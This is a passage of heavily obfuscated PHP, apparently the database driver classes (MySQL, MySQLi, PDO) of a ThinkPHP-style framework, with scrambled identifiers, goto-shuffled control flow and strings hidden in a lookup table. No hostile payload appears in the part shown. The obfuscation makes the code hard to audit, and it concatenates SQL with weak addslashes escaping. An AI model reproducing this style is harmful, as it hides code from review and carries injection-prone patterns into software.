$aÕÔŞĞ…‡Ù[844])); goto B¹•³ÛÙÕ˜; béËÊ²…Ê²: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $F’èäõ–ì =& $_SERVER[µ…]; $this->error = mysql_errno() . $F’èäõ–ì[4] . mysql_error($this->_linkID); if ($F’èäõ–ì[33] != $this->queryStr) { $this->error .= LNG($F’èäõ–ì[45]) . $this->queryStr; } think_trace($this->error, $F’èäõ–ì[33], $F’èäõ–ì[46]); return $this->error; } public function escapeString($A‡ÕÏ¹”‹§) { if ($this->_linkID) { return mysql_real_escape_string($A‡ÕÏ¹”‹§, $this->_linkID); } else { return mysql_escape_string($A‡ÕÏ¹”‹§); } } public function parseKey(&$a¯‚·›îĞ, $aèÉµÊí¶Š = true) { $DøŒ«¼ =& $_SERVER[µ…]; if ($aèÉµÊí¶Š) { $a¯‚·›îĞ = $this->parseKeyCheck($a¯‚·›îĞ); } if ($a¯‚·›îĞ != $DøŒ«¼[181] && !preg_match($DøŒ«¼[849], $a¯‚·›îĞ)) { $a¯‚·›îĞ = $DøŒ«¼[380] . trim($a¯‚·›îĞ, $DøŒ«¼[380]) . $DøŒ«¼[380]; } return $a¯‚·›îĞ; } } class DbMysqli extends Db { public function __construct($B¿Îö¼²á = '') { $B·æ¤¶¢Š =& $_SERVER[µ…]; if (!extension_loaded($B·æ¤¶¢Š[743])) { think_exception(think_lang($B·æ¤¶¢Š[10]) . $B·æ¤¶¢Š[850]); } if (!empty($B¿Îö¼²á)) { $this->config = $B¿Îö¼²á; if (empty($this->config[$B·æ¤¶¢Š[13]])) { $this->config[$B·æ¤¶¢Š[13]] = $B·æ¤¶¢Š[33]; } } } public function connect($A¥åîƒÕÁ  = '', $CÑ…‰‡Æ½ = 0) { $dàó‹¡¤¾ =& $_SERVER[µ…]; if (!isset($this->linkID[$CÑ…‰‡Æ½])) { goto A¦×³¢É˜¥; A¦×³¢É˜¥: if (empty($A¥åîƒÕÁ )) { $A¥åîƒÕÁ  = $this->config; } $this->linkID[$CÑ…‰‡Æ½] = new mysqli($A¥åîƒÕÁ [$dàó‹¡¤¾[824]], $A¥åîƒÕÁ [$dàó‹¡¤¾[826]], $A¥åîƒÕÁ [$dàó‹¡¤¾[827]], $A¥åîƒÕÁ [$dàó‹¡¤¾[17]], $A¥åîƒÕÁ [$dàó‹¡¤¾[825]] ? intval($A¥åîƒÕÁ [$dàó‹¡¤¾[825]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto E×ÊŠÎ…÷í; E×ÊŠÎ…÷í: $c¼Š‹©Úç• = $this->linkID[$CÑ…‰‡Æ½]->server_version; $this->linkID[$CÑ…‰‡Æ½]->query($dàó‹¡¤¾[828] . think_config($dàó‹¡¤¾[829]) . $dàó‹¡¤¾[55]); if ($c¼Š‹©Úç• > $dàó‹¡¤¾[830]) { $this->linkID[$CÑ…‰‡Æ½]->query($dàó‹¡¤¾[831]); } goto eİƒÄ™Ä ô; eİƒÄ™Ä ô: $this->connected = !0; if (1 != think_config($dàó‹¡¤¾[18])) { unset($this->config); } goto c‰¶¼’ùµ; c‰¶¼’ùµ: } return $this->linkID[$CÑ…‰‡Æ½]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($EğÚëÁòÙÙ) { goto fµç‘Æèç; dŠ…Š¥°: $this->queryStr = $EğÚëÁòÙÙ; if ($this->queryID) { $this->free(); } think_action_status($F£¢´ÖÖÇÆ[19], 1); goto FíàÓæ§—•; FíàÓæ§—•: think_status($F£¢´ÖÖÇÆ[20]); $this->queryID = $this->_linkID->query($EğÚëÁòÙÙ); if ($this->_linkID->more_results()) { while (($c‘œ¸ï¹‰ = $this->_linkID->next_result()) != NULL) { $c‘œ¸ï¹‰->free_result(); } } goto A¡÷ä‘¼Ÿ¹; fµç‘Æèç: $F£¢´ÖÖÇÆ =& $_SERVER[µ…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dŠ…Š¥°; A¡÷ä‘¼Ÿ¹: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto e³¨ÇÁÓ‰ë; e³¨ÇÁÓ‰ë: } public function execute($aÁ¦Ò„ƒ) { goto aùÃßçÉº; aÇå„ğØô: if (!1 === $C‘òê¿ŞÑØ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aè§õ°Š; aùÃßçÉº: $cäÖ¬Ü´õ« =& $_SERVER[µ…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F…©óƒÔ¦…; D£«¼ğİ×º: think_status($cäÖ¬Ü´õ«[20]); $C‘òê¿ŞÑØ = $this->_linkID->query($aÁ¦Ò„ƒ); $this->debug(); goto aÇå„ğØô; F…©óƒÔ¦…: $this->queryStr = $aÁ¦Ò„ƒ; if ($this->queryID) { $this->free(); } think_action_status($cäÖ¬Ü´õ«[21], 1); goto D£«¼ğİ×º; aè§õ°Š: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cµ÷ãò›õ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$cµ÷ãò›õ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¢‡ñğ¡¨¢ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A¢‡ñğ¡¨¢) { $this->error(); return !1; } } return !0; } private function getAll() { $B”ø½Ó‚“œ = array(); if ($this->numRows > 0) { for ($eììŠ­ó³ = 0; $eììŠ­ó³ < $this->numRows; $eììŠ­ó³++) { $B”ø½Ó‚“œ[$eììŠ­ó³] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $B”ø½Ó‚“œ; } public function getFields($cÂï¥ƒê„š) { $a¢»ï³Å´ö =& $_SERVER[µ…]; $aÕ˜Òï¼¼Õ = $this->query($a¢»ï³Å´ö[835] . $this->parseKey($cÂï¥ƒê„š)); $d­‰ò¼õ¤Ü = array(); if ($aÕ˜Òï¼¼Õ) { foreach ($aÕ˜Òï¼¼Õ as $c¨—ˆó™£ => $B³ã÷Ëç¶©) { $d­‰ò¼õ¤Ü[$B³ã÷Ëç¶©[$a¢»ï³Å´ö[27]]] = array($a¢»ï³Å´ö[28] => $B³ã÷Ëç¶©[$a¢»ï³Å´ö[27]], $a¢»ï³Å´ö[29] => $B³ã÷Ëç¶©[$a¢»ï³Å´ö[30]], $a¢»ï³Å´ö[31] => (bool) ($B³ã÷Ëç¶©[$a¢»ï³Å´ö[32]] === $a¢»ï³Å´ö[33]), $a¢»ï³Å´ö[34] => $B³ã÷Ëç¶©[$a¢»ï³Å´ö[35]], $a¢»ï³Å´ö[36] => strtolower($B³ã÷Ëç¶©[$a¢»ï³Å´ö[37]]) == $a¢»ï³Å´ö[38], $a¢»ï³Å´ö[39] => strtolower($B³ã÷Ëç¶©[$a¢»ï³Å´ö[40]]) == $a¢»ï³Å´ö[41]); } } return $d­‰ò¼õ¤Ü; } public function getTables($bÑµšè‚´Ğ = '') { $aòæöì©¼³ =& $_SERVER[µ…]; $b³âòÛÉĞ¸ = !empty($bÑµšè‚´Ğ) ? $aòæöì©¼³[837] . $bÑµšè‚´Ğ . $aòæöì©¼³[838] : $aòæöì©¼³[839]; $EÆª‰¡¦ = $this->query($b³âòÛÉĞ¸); $bŞİ„Ôä¡‹ = array(); if ($EÆª‰¡¦) { foreach ($EÆª‰¡¦ as $B·ÅğÍ„¤º => $F …ùŸ¹¬) { $bŞİ„Ôä¡‹[$B·ÅğÍ„¤º] = current($F …ùŸ¹¬); } } return $bŞİ„Ôä¡‹; } public function replace($f„ÃÙËïÆ‚, $d÷¹«ÊëÒà = array()) { $AÇšª±µ¼§ =& $_SERVER[µ…]; foreach ($f„ÃÙËïÆ‚ as $e¾½ù§ÎÚø => $bÄ·øôç£…) { $a„Ü‰ÑÛÅ‡ = $this->parseValue($bÄ·øôç£…); if (is_scalar($a„Ü‰ÑÛÅ‡)) { $A†§é¯°¸ô[] = $a„Ü‰ÑÛÅ‡; $D¯ Ûµõ‹—[] = $this->parseKey($e¾½ù§ÎÚø); } } $f‹íã›ìöä = $AÇšª±µ¼§[840] . $this->parseTable($d÷¹«ÊëÒà[$AÇšª±µ¼§[275]]) . $AÇšª±µ¼§[841] . implode($AÇšª±µ¼§[47], $D¯ Ûµõ‹—) . $AÇšª±µ¼§[842] . implode($AÇšª±µ¼§[47], $A†§é¯°¸ô) . $AÇšª±µ¼§[843]; return $this->execute($f‹íã›ìöä); } public function insertAll($f¼“¡Ùõ¸‹, $Bèºã±Ï·Ò = array(), $CÕ’ÒÜÌÚ = false) { goto DÑ¼•‡¶; D³—è»Õß…: $F˜ñÚ®«–È = $CÕ’ÒÜÌÚ ? $a­ ·Ó¡Šì[845] : $a­ ·Ó¡Šì[846]; $E »˜ÔöÅĞ = $F˜ñÚ®«–È . $a­ ·Ó¡Šì[847] . $this->parseTable($Bèºã±Ï·Ò[$a­ ·Ó¡Šì[275]]) . $a­ ·Ó¡Šì[841] . implode($a­ ·Ó¡Šì[47], $F¡çÉù‘–) . $a­ ·Ó¡Šì[848] . implode($a­ ·Ó¡Šì[47], $C¯—ÛÊ«¬); return $this->execute($E »˜ÔöÅĞ); goto aøÒÜåß; CÖÓœÜÃ¼œ: $C¯—ÛÊ«¬ = array(); foreach ($f¼“¡Ùõ¸‹ as $Eù‘ÍÜåÛ®) { $A£Ôğ„…Œ• = array(); foreach ($Eù‘ÍÜåÛ® as $CÙ´¤ƒ¸¥¾ => $e¬Ä¤‰Ûñ) { $e¬Ä¤‰Ûñ = $this->parseValue($e¬Ä¤‰Ûñ); if (is_scalar($e¬Ä¤‰Ûñ)) { $A£Ôğ„…Œ•[] = $e¬Ä¤‰Ûñ; } } $C¯—ÛÊ«¬[] = $a­ ·Ó¡Šì[256] . implode($a­ ·Ó¡Šì[47], $A£Ôğ„…Œ•) . $a­ ·Ó¡Šì[843]; } array_walk($F¡çÉù‘–, array($this, $a­ ·Ó¡Šì[844])); goto D³—è»Õß…; DÑ¼•‡¶: $a­ ·Ó¡Šì =& $_SERVER[µ…]; if (!is_array($f¼“¡Ùõ¸‹[0])) { return !1; } $F¡çÉù‘– = array_keys($f¼“¡Ùõ¸‹[0]); goto CÖÓœÜÃ¼œ; aøÒÜåß: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $DÀÈöãñâç =& $_SERVER[µ…]; $this->error = $this->_linkID->errno . $DÀÈöãñâç[4] . $this->_linkID->error; if ($DÀÈöãñâç[33] != $this->queryStr) { $this->error .= LNG($DÀÈöãñâç[45]) . $this->queryStr; } think_trace($this->error, $DÀÈöãñâç[33], $DÀÈöãñâç[46]); return $this->error; } public function escapeString($BÌãëì‡½‹) { if ($this->_linkID) { return $this->_linkID->real_escape_string($BÌãëì‡½‹); } else { return addslashes($BÌãëì‡½‹); } } public function parseKey(&$BÚÉ¾¤ù, $cğÕ¥Ÿ¿© = true) { $B‰÷Í™ƒ› =& $_SERVER[µ…]; if ($cğÕ¥Ÿ¿©) { $BÚÉ¾¤ù = $this->parseKeyCheck($BÚÉ¾¤ù); } if ($BÚÉ¾¤ù != $B‰÷Í™ƒ›[181] && !preg_match($B‰÷Í™ƒ›[849], $BÚÉ¾¤ù)) { $BÚÉ¾¤ù = $B‰÷Í™ƒ›[380] . trim($BÚÉ¾¤ù, $B‰÷Í™ƒ›[380]) . $B‰÷Í™ƒ›[380]; } return $BÚÉ¾¤ù; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($eÆÔí•ÈË = '') { $dËÉíïôá‰ =& $_SERVER[µ…]; if (!class_exists($dËÉíïôá‰[851])) { think_exception(think_lang($dËÉíïôá‰[10]) . $dËÉíïôá‰[852]); } if (!empty($eÆÔí•ÈË)) { $this->config = $eÆÔí•ÈË; if (empty($this->config[$dËÉíïôá‰[13]])) { $this->config[$dËÉíïôá‰[13]] = array(); } } } public function connect($e…ÃÓÌöÀ÷ = '', $Dä ³‡†ë = 0) { $Aã×ŸƒÁ™ =& $_SERVER[µ…]; if (!isset($this->linkID[$Dä ³‡†ë])) { goto eğÄĞ¤†’Ñ; fğŒí§÷õ³: if (!$this->linkID[$Dä ³‡†ë]) { think_exception($Aã×ŸƒÁ™[861]); } try { $this->linkID[$Dä ³‡†ë]->exec($Aã×ŸƒÁ™[862] . think_config($Aã×ŸƒÁ™[829])); } catch (Exception $f²êÍñ×Œ›) { } $this->connected = !0; goto còÀ³ºë³Û; C§ŞÛøŸ¾•: try { $this->linkID[$Dä ³‡†ë] = new PDO($e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[853]], $e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[826]], $e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[827]], $e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[13]]); } catch (PDOException $f²êÍñ×Œ›) { think_exception($f²êÍñ×Œ›->getMessage()); } $this->dbType = $this->_getDsnType($e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[853]]); if (in_array($this->dbType, array($Aã×ŸƒÁ™[854], $Aã×ŸƒÁ™[855], $Aã×ŸƒÁ™[856], $Aã×ŸƒÁ™[857]))) { think_exception($Aã×ŸƒÁ™[858] . $this->dbType . $Aã×ŸƒÁ™[859] . $this->dbType . $Aã×ŸƒÁ™[860]); } goto fğŒí§÷õ³; eğÄĞ¤†’Ñ: if (empty($e…ÃÓÌöÀ÷)) { $e…ÃÓÌöÀ÷ = $this->config; } $C„±Î¨è– = !empty($e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[13]][$Aã×ŸƒÁ™[14]]) ? $e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[13]][$Aã×ŸƒÁ™[14]] : $this->pconnect; if ($C„±Î¨è–) { $e…ÃÓÌöÀ÷[$Aã×ŸƒÁ™[13]][PDO::ATTR_PERSISTENT] = !0; } goto C§ŞÛøŸ¾•; còÀ³ºë³Û: if (1 != think_config($Aã×ŸƒÁ™[18])) { unset($this->config); } goto d§Ú¼†‰; d§Ú¼†‰: } return $this->linkID[$Dä ³‡†ë]; } public function free() { $this->PDOStatement = null; } public function query($aĞéÓËã—°, $c²Ó•Ÿ¤‹Š = array()) { goto A Ş‹•ªÉ¢; aÃ’©Û“†: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $A²¾æ´Œ†ã = $this->PDOStatement->execute($c²Ó•Ÿ¤‹Š); $this->debug(); goto B©è‡¨éŒ; D‚¹½£©Ò: think_action_status($eŸĞ½ØÁ¤„[19], 1); think_status($eŸĞ½ØÁ¤„[20]); $this->PDOStatement = $this->_linkID->prepare($aĞéÓËã—°); goto aÃ’©Û“†; d†´‹Ş¬Œ¶: $this->queryStr = $aĞéÓËã—°; if (!empty($c²Ó•Ÿ¤‹Š)) { $this->queryStr .= $eŸĞ½ØÁ¤„[863] . print_r($c²Ó•Ÿ¤‹Š, !0) . $eŸĞ½ØÁ¤„[864]; } if (!empty($this->PDOStatement)) { $this->free(); } goto D‚¹½£©Ò; B©è‡¨éŒ: if (!1 === $A²¾æ´Œ†ã) { $this->error(); return !1; } else { return $this->getAll(); } goto FŠ¾ØÆÛğò; A Ş‹•ªÉ¢: $eŸĞ½ØÁ¤„ =& $_SERVER[µ…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d†´‹Ş¬Œ¶; FŠ¾ØÆÛğò: } public function execute($E—İ•¾¤‡ò, $f‰®êÖí‡ = array()) { goto f¬æÜ«³¢; c¯è÷ß¯Ø: if ($this->dbType == $A¬¥ ÕØĞé[857]) { if (preg_match($A¬¥ ÕØĞé[865], $this->queryStr, $C•ßêÓÅÒ†)) { $this->table = think_config($A¬¥ ÕØĞé[866]) . str_ireplace(think_config($A¬¥ ÕØĞé[867]), $A¬¥ ÕØĞé[373], $C•ßêÓÅÒ†[2]); $eÔ¾ÜË Í£ = (bool) $this->query($A¬¥ ÕØĞé[868] . strtoupper($this->table) . $A¬¥ ÕØĞé[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($A¬¥ ÕØĞé[21], 1); goto A¥Êõ‹¬²å; b™ÃÏ°©»ˆ: $Aê±×î×¡Ê = $this->PDOStatement->execute($f‰®êÖí‡); $this->debug(); if (!1 === $Aê±×î×¡Ê) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($eÔ¾ÜË Í£ || preg_match($A¬¥ ÕØĞé[869], $E—İ•¾¤‡ò)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto FŸÈïŸ»Ñ‡; f¬æÜ«³¢: $A¬¥ ÕØĞé =& $_SERVER[µ…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D­Ôäß­Î; A¥Êõ‹¬²å: think_status($A¬¥ ÕØĞé[20]); $this->PDOStatement = $this->_linkID->prepare($E—İ•¾¤‡ò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto b™ÃÏ°©»ˆ; D­Ôäß­Î: $this->queryStr = $E—İ•¾¤‡ò; if (!empty($f‰®êÖí‡)) { $this->queryStr .= $A¬¥ ÕØĞé[863] . print_r($f‰®êÖí‡, !0) . $A¬¥ ÕØĞé[864]; } $eÔ¾ÜË Í£ = !1; goto c¯è÷ß¯Ø; FŸÈïŸ»Ñ‡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c…æµ•²ô¯ = $this->_linkID->commit(); $this->transTimes = 0; if (!$c…æµ•²ô¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F¢¬ºÂĞÚ¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F¢¬ºÂĞÚ¤) { $this->error(); return !1; } } return !0; } private function getAll() { $e˜¬˜œš¶ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($e˜¬˜œš¶); return $e˜¬˜œš¶; } public function getFields($BÄöˆ¿á­) { goto bÔ™ÑÄ®¶ë; Dæ‚÷»¥•: return $CéÊòĞÅ›; goto E´Ï™ğÏØï; bÔ™ÑÄ®¶ë: $cºŠä¶ç¾æ =& $_SERVER[µ…]; $this->initConnect(!0); if (think_config($cºŠä¶ç¾æ[870])) { $F¡¦ÑÈ¤­‘ = str_replace($cºŠä¶ç¾æ[871], $BÄöˆ¿á­, think_config($cºŠä¶ç¾æ[870])); } else { switch ($this->dbType) { case $cºŠä¶ç¾æ[854]: case $cºŠä¶ç¾æ[872]: $F¡¦ÑÈ¤­‘ = "\123\x45\114\x45\103\x54\x20\x20\40\x63\157\x6c\x75\x6d\x6e\x5f\x6e\141\x6d\x65\x20\141\163\x20\x27\116\x61\x6d\x65\x27\54\40\40\x20\144\x61\164\x61\137\164\x79\160\145\40\x61\x73\x20\x27\124\171\x70\x65\x27\54\x20\40\40\x63\157\x6c\165\x6d\x6e\x5f\x64\145\x66\x61\165\x6c\164\x20\141\x73\x20\x27\x44\x65\146\141\x75\x6c\x74\47\54\x20\40\x20\x69\163\x5f\156\x75\154\154\141\142\154\x65\x20\x61\163\40\x27\x4e\165\154\x6c\x27\xa\x9\11\106\x52\x4f\115\11\x69\x6e\x66\157\x72\x6d\x61\164\x69\x6f\x6e\137\x73\143\150\x65\x6d\x61\x2e\164\x61\x62\x6c\x65\x73\x20\x41\123\x20\164\xa\11\x9\x4a\117\x49\116\11\x69\x6e\x66\157\x72\155\141\164\x69\x6f\156\137\163\x63\x68\x65\155\x61\x2e\x63\157\x6c\x75\155\156\163\40\101\x53\x20\x63\xa\x9\11\x4f\116\40\x20\164\56\x74\141\142\x6c\x65\137\143\141\164\141\154\157\x67\40\x3d\x20\143\x2e\164\x61\142\x6c\145\137\x63\141\x74\141\154\x6f\147\12\11\11\x41\116\104\40\164\56\164\x61\142\x6c\145\x5f\x73\143\150\x65\x6d\141\x20\75\x20\143\56\x74\141\142\154\x65\137\x73\x63\150\x65\155\141\xa\11\x9\x41\x4e\104\x20\x74\x2e\164\141\142\154\x65\x5f\x6e\141\x6d\145\x20\75\40\x63\x2e\x74\x61\142\x6c\x65\137\x6e\141\155\x65\12\11\x9\x57\110\105\122\x45\x20\40\x20\x74\x2e\x74\x61\x62\x6c\145\137\156\141\x6d\x65\x20\75\x20\47{$BÄöˆ¿á­}\47"; break; case $cºŠä¶ç¾æ[873]: $F¡¦ÑÈ¤­‘ = $cºŠä¶ç¾æ[874] . $BÄöˆ¿á­ . $cºŠä¶ç¾æ[875]; break; case $cºŠä¶ç¾æ[855]: case $cºŠä¶ç¾æ[857]: $F¡¦ÑÈ¤­‘ = $cºŠä¶ç¾æ[876] . $cºŠä¶ç¾æ[877] . $cºŠä¶ç¾æ[878] . strtoupper($BÄöˆ¿á­) . $cºŠä¶ç¾æ[879] . strtoupper($BÄöˆ¿á­) . $cºŠä¶ç¾æ[880]; break; case $cºŠä¶ç¾æ[881]: $F¡¦ÑÈ¤­‘ = $cºŠä¶ç¾æ[882] . $BÄöˆ¿á­ . $cºŠä¶ç¾æ[883]; break; case $cºŠä¶ç¾æ[856]: break; case $cºŠä¶ç¾æ[884]: default: $F¡¦ÑÈ¤­‘ = $cºŠä¶ç¾æ[885] . ($this->dbType == $cºŠä¶ç¾æ[884] ? "\x60{$BÄöˆ¿á­}\140" : $BÄöˆ¿á­); } } goto Fèê÷ë´; Fèê÷ë´: $C¨šíùÇ‚• = $this->query($F¡¦ÑÈ¤­‘); $CéÊòĞÅ› = array(); if ($C¨šíùÇ‚•) { foreach ($C¨šíùÇ‚• as $f£‚óôÇŒ => $A‘„¼ø“Û) { $A‘„¼ø“Û = array_change_key_case($A‘„¼ø“Û); $A‘„¼ø“Û[$cºŠä¶ç¾æ[28]] = isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[28]]) ? $A‘„¼ø“Û[$cºŠä¶ç¾æ[28]] : $cºŠä¶ç¾æ[373]; $A‘„¼ø“Û[$cºŠä¶ç¾æ[29]] = isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[29]]) ? $A‘„¼ø“Û[$cºŠä¶ç¾æ[29]] : $cºŠä¶ç¾æ[373]; $Cã×Àì·Ññ = isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[269]]) ? $A‘„¼ø“Û[$cºŠä¶ç¾æ[269]] : $A‘„¼ø“Û[$cºŠä¶ç¾æ[28]]; $CéÊòĞÅ›[$Cã×Àì·Ññ] = array($cºŠä¶ç¾æ[28] => $Cã×Àì·Ññ, $cºŠä¶ç¾æ[29] => $A‘„¼ø“Û[$cºŠä¶ç¾æ[29]], $cºŠä¶ç¾æ[31] => (bool) (isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[102]]) && $A‘„¼ø“Û[$cºŠä¶ç¾æ[102]] === $cºŠä¶ç¾æ[33] || isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[31]]) && $A‘„¼ø“Û[$cºŠä¶ç¾æ[31]] === $cºŠä¶ç¾æ[33]), $cºŠä¶ç¾æ[34] => isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[34]]) ? $A‘„¼ø“Û[$cºŠä¶ç¾æ[34]] : (isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[53]]) ? $A‘„¼ø“Û[$cºŠä¶ç¾æ[53]] : $cºŠä¶ç¾æ[373]), $cºŠä¶ç¾æ[36] => isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[92]]) ? strtolower($A‘„¼ø“Û[$cºŠä¶ç¾æ[92]]) == $cºŠä¶ç¾æ[38] : (isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[54]]) ? $A‘„¼ø“Û[$cºŠä¶ç¾æ[54]] : !1), $cºŠä¶ç¾æ[39] => isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[886]]) ? strtolower($A‘„¼ø“Û[$cºŠä¶ç¾æ[886]]) == $cºŠä¶ç¾æ[41] : (isset($A‘„¼ø“Û[$cºŠä¶ç¾æ[92]]) ? $A‘„¼ø“Û[$cºŠä¶ç¾æ[92]] : !1)); } } goto Dæ‚÷»¥•; E´Ï™ğÏØï: } public function getTables($CßÜéóãŒ = '') { $b÷î†ò·å… =& $_SERVER[µ…]; if (think_config($b÷î†ò·å…[887])) { $EÑ‘ÅÓù±ç = str_replace($b÷î†ò·å…[888], $CßÜéóãŒ, think_config($b÷î†ò·å…[887])); } else { switch ($this->dbType) { case $b÷î†ò·å…[855]: case $b÷î†ò·å…[857]: $EÑ‘ÅÓù±ç = $b÷î†ò·å…[889]; break; case $b÷î†ò·å…[854]: case $b÷î†ò·å…[872]: $EÑ‘ÅÓù±ç = $b÷î†ò·å…[890]; break; case $b÷î†ò·å…[881]: $EÑ‘ÅÓù±ç = $b÷î†ò·å…[891]; break; case $b÷î†ò·å…[856]: think_exception(think_lang($b÷î†ò·å…[892]) . $b÷î†ò·å…[893]); break; case $b÷î†ò·å…[873]: $EÑ‘ÅÓù±ç = $b÷î†ò·å…[42] . $b÷î†ò·å…[43] . $b÷î†ò·å…[44]; break; case $b÷î†ò·å…[884]: default: if (!empty($CßÜéóãŒ)) { $EÑ‘ÅÓù±ç = $b÷î†ò·å…[837] . $CßÜéóãŒ . $b÷î†ò·å…[838]; } else { $EÑ‘ÅÓù±ç = $b÷î†ò·å…[839]; } } } $c’§­³ÔÇÖ = $this->query($EÑ‘ÅÓù±ç); $cäÂãğ¹†‡ = array(); foreach ($c’§­³ÔÇÖ as $e‹µ½ÇÇ›É => $CÂƒåö¶) { $cäÂãğ¹†‡[$e‹µ½ÇÇ›É] = current($CÂƒåö¶); } return $cäÂãğ¹†‡; } protected function parseLimit($BÍ°ÕÂ¿Æà) { $EØ¶Œ……®› =& $_SERVER[µ…]; $d”öÊ¿’é­ = $EØ¶Œ……®›[33]; if (!empty($BÍ°ÕÂ¿Æà)) { switch ($this->dbType) { case $EØ¶Œ……®›[881]: case $EØ¶Œ……®›[873]: $BÍ°ÕÂ¿Æà = explode($EØ¶Œ……®›[47], $BÍ°ÕÂ¿Æà); if (count($BÍ°ÕÂ¿Æà) > 1) { $d”öÊ¿’é­ .= $EØ¶Œ……®›[48] . $BÍ°ÕÂ¿Æà[1] . $EØ¶Œ……®›[49] . $BÍ°ÕÂ¿Æà[0] . $EØ¶Œ……®›[50]; } else { $d”öÊ¿’é­ .= $EØ¶Œ……®›[48] . $BÍ°ÕÂ¿Æà[0] . $EØ¶Œ……®›[50]; } break; case $EØ¶Œ……®›[854]: case $EØ¶Œ……®›[872]: break; case $EØ¶Œ……®›[856]: break; case $EØ¶Œ……®›[855]: case $EØ¶Œ……®›[857]: break; case $EØ¶Œ……®›[884]: default: $d”öÊ¿’é­ .= $EØ¶Œ……®›[48] . $BÍ°ÕÂ¿Æà . $EØ¶Œ……®›[50]; } } return $d”öÊ¿’é­; } public function parseKey(&$c¾œ˜Å´ŠŠ, $F–ŞĞŸ×ŒÔ = true) { $c‹Ò¡äºŸ =& $_SERVER[µ…]; if ($F–ŞĞŸ×ŒÔ) { $c¾œ˜Å´ŠŠ = $this->parseKeyCheck($c¾œ˜Å´ŠŠ); } if ($this->dbType == $c‹Ò¡äºŸ[884]) { if ($c¾œ˜Å´ŠŠ != $c‹Ò¡äºŸ[181] && !preg_match($c‹Ò¡äºŸ[849], $c¾œ˜Å´ŠŠ)) { $c¾œ˜Å´ŠŠ = $c‹Ò¡äºŸ[380] . trim($c¾œ˜Å´ŠŠ, $c‹Ò¡äºŸ[380]) . $c‹Ò¡äºŸ[380]; } return $c¾œ˜Å´ŠŠ; } else { return parent::parseKey($c¾œ˜Å´ŠŠ, $F–ŞĞŸ×ŒÔ); } } public function close() { $this->_linkID = null; } public function error() { $e¥¡·‰ëíÚ =& $_SERVER[µ…]; if ($this->PDOStatement) { $fí§•÷Ş°ù = $this->PDOStatement->errorInfo(); $this->error = $fí§•÷Ş°ù[1] . $e¥¡·‰ëíÚ[4] . $fí§•÷Ş°ù[2]; } else { $this->error = $e¥¡·‰ëíÚ[33]; } if ($e¥¡·‰ëíÚ[33] != $this->queryStr) { $this->error .= LNG($e¥¡·‰ëíÚ[45]) . $this->queryStr; } think_trace($this->error, $e¥¡·‰ëíÚ[33], $e¥¡·‰ëíÚ[46]); return $this->error; } public function escapeString($CÛë¯ö‰¢) { $cììˆ†˜ßØ =& $_SERVER[µ…]; switch ($this->dbType) { case $cììˆ†˜ßØ[881]: case $cììˆ†˜ßØ[854]: case $cììˆ†˜ßØ[872]: case $cììˆ†˜ßØ[884]: return addslashes($CÛë¯ö‰¢); case $cììˆ†˜ßØ[856]: case $cììˆ†˜ßØ[873]: case $cììˆ†˜ßØ[855]: case $cììˆ†˜ßØ[857]: return str_ireplace($cììˆ†˜ßØ[55], $cììˆ†˜ßØ[56], $CÛë¯ö‰¢); } } protected function parseValue($c‡»ˆ§·¿À) { $F”÷»óå =& $_SERVER[µ…]; if (is_string($c‡»ˆ§·¿À)) { $c‡»ˆ§·¿À = strpos($c‡»ˆ§·¿À, $F”÷»óå[4]) === 0 ? $this->escapeString($c‡»ˆ§·¿À) : $F”÷»óå[894] . $this->escapeString($c‡»ˆ§·¿À) . $F”÷»óå[894]; } elseif (isset($c‡»ˆ§·¿À[0]) && is_string($c‡»ˆ§·¿À[0]) && strtolower($c‡»ˆ§·¿À[0]) == $F”÷»óå[293]) { $c‡»ˆ§·¿À = 